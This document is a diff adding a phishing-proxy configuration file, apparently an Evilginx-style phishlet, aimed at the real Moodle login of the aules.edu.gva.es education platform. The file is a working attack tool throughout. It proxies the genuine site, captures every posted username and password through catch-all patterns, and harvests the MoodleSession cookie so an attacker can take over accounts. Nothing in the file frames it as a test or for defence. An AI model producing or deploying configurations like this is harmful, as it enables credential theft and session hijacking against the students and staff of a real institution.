@@ -1,0 +1,31 @@
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'aules.edu', orig_sub: 'aules.edu', domain: 'gva.es', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gva.es', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'aules.edu.gva.es', orig_sub: 'aules.edu', domain: 'gva.es', search: '{hostname}/fp/theme/yui_combo.php', replace: '{orig_hostname}/fp/theme/yui_combo.php', mimes: ['text/html']}
+  - {triggers_on: 'www.gva.es', orig_sub: 'www', domain: 'gva.es', search: '{hostname}/combo', replace: '{orig_hostname}/combo', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: 'aules.edu.gva.es'
+    keys: ['MoodleSession']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'aules.edu.gva.es'
+  path: '/fp/login/index.php'
+
+auth_urls:
+  - '/fp/my/'
